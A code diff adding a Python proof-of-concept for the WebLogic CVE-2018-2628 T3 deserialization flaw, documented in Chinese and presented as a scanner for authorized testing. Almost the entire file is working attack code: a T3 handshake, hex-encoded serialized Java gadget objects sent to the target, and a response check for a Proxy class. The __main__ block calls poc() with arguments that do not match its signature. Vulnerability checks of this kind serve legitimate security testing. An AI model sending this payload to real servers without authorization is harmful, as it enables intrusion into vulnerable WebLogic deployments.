@@ -1,0 +1,182 @@
+#!env python
+#coding=utf-8
+# -*- coding: utf-8 -*-
+"""
+WebLogic CVE-2018-2628 POC 检测脚本
+
+漏洞描述：
+Oracle WebLogic Server 的 T3 协议存在反序列化漏洞（CVE-2018-2628）。
+攻击者可以通过发送恶意的 T3 请求来执行任意代码。
+
+影响版本：
+- Oracle WebLogic Server 10.3.6.0
+- Oracle WebLogic Server 12.1.3.0
+- Oracle WebLogic Server 12.2.1.2
+- Oracle WebLogic Server 12.2.1.3
+
+检测原理：
+通过建立 T3 连接并发送恶意的反序列化 payload，
+如果服务器返回包含 Proxy 对象的响应，则说明存在漏洞。
+
+使用方法：
+    python cve_2018_2628_poc.py
+    或在代码中调用 poc(url) 函数
+
+参数说明：
+    url: 目标URL，如 http://127.0.0.1:7001
+    timeout: 请求超时时间（秒），默认10秒
+
+返回值：
+    (True, '存在漏洞') - 检测到漏洞
+    (False, '安全') - 未检测到漏洞
+    (False, '扫描失败 - 错误信息') - 扫描过程中出现错误
+
+注意：
+    此POC仅用于安全测试和授权的渗透测试，请勿用于非法用途。
+"""
+
+import socket
+import time
+import re
+
+VUL=['CVE-2018-2628']
+PAYLOAD=['ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707729000A556E69636173745265660000000005A2000000005649E3FD00000000000000000000000000000078']
+VER_SIG=['\\$Proxy[0-9]+']
+result_data = ''
+
+def t3handshake(sock,server_addr):
+    """
+    建立 T3 握手连接
+    
+    Args:
+        sock: socket 对象
+        server_addr: 服务器地址 (ip, port)
+    """
+    sock.connect(server_addr)
+    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
+    time.sleep(0.1)
+    sock.recv(1024)
+    print('[*] handshake successful')
+
+def buildT3RequestObject(sock,dport):
+    """
+    构建 T3 请求对象
+    
+    Args:
+        sock: socket 对象
+        dport: 目标端口号
+    """
+    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
+    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
+    data3 = '1a7727000d3234322e323134'
+    data4 = '2e312e32353461863d1d0000000078'
+    for d in [data1,data2,data3,data4]:
+        sock.send(bytes.fromhex(d))
+        # print('\nb:',bytes.fromhex(d))
+    time.sleep(0.1)
+    print('[*] send request payload successful,recv length:%d'%(len(sock.recv(2048))))
+
+def sendEvilObjData(sock,data):
+    """
+    发送恶意对象数据
+    
+    Args:
+        sock: socket 对象
+        data: 要发送的恶意数据
+    
+    Returns:
+        str: 服务器响应内容
+    """
+    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
+    payload+=data
+    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
+    # payload = '%s%s' % ('{:08x}'.format(len(payload)/2 + 4),payload)
+    payload = hex(int(len(payload)/2) + 4)[2:].rjust(8,'0') + payload
+    # print(payload)
+    sock.send(bytes.fromhex(payload))
+    # print("\nsend: ", bytes.fromhex(payload))
+    time.sleep(0.1)
+    sock.send(bytes.fromhex(payload))
+    res = ''
+    try:
+        while True:
+            res += str(sock.recv(4096)) # python3 bytes转str才能用+=
+            # time.sleep(0.1)
+    except Exception as e:
+        print(e)
+        pass
+    return res
+
+def checkVul(res,server_addr,index):
+    """
+    检查是否存在漏洞
+    
+    Args:
+        res: 服务器响应内容
+        server_addr: 服务器地址 (ip, port)
+        index: 漏洞索引
+    
+    Returns:
+        bool: 是否存在漏洞
+    """
+    p=re.findall(VER_SIG[index], res, re.S)
+    # print("\nres: ", res)
+    if len(p)>0:
+        print('[+] %s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]))
+        return True
+    else:
+        print('[-] %s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]))
+        return False
+
+from urllib.parse import urlparse
+
+def poc(url, timeout=10):
+    """
+    检测目标是否存在 WebLogic CVE-2018-2628 漏洞
+    
+    Args:
+        url: 目标URL，如 http://127.0.0.1:7001
+        timeout: 请求超时时间（秒），默认10秒
+    
+    Returns:
+        tuple: (是否存在漏洞, 结果消息)
+    """
+    index = 0
+    try:
+        if not url.startswith('http'):
+            url = 'http://' + url
+        parsed = urlparse(url)
+        dip = parsed.hostname
+        dport = parsed.port
+        if not dport:
+             if parsed.scheme == 'https': dport = 443
+             else: dport = 80
+             # WebLogic usually runs on 7001, but if user provides url without port, we use default http ports
+             # unless we want to try 7001 if port 80 fails? 
+             # Let's stick to port in URL or default http/https.
+        
+        if not dip:
+             dip = '127.0.0.1'
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        server_addr = (dip, dport)
+        t3handshake(sock, server_addr)
+        buildT3RequestObject(sock, dport)
+        rs=sendEvilObjData(sock, PAYLOAD[index])
+        # print(rs)
+        if checkVul(rs, server_addr, index):
+            return True, 'WebLogic CVE-2018-2628: 存在漏洞'
+        return False, 'WebLogic CVE-2018-2628: 安全'
+    except Exception as e:
+        return False, f'WebLogic CVE-2018-2628: 扫描失败 - {str(e)}'
+
+
+if __name__=="__main__":
+    import datetime
+    start = datetime.datetime.now()
+    dip = "127.0.0.1"
+    dport = 7001
+    poc(dip,dport,0)
+    end = datetime.datetime.now()
+    print(end - start)
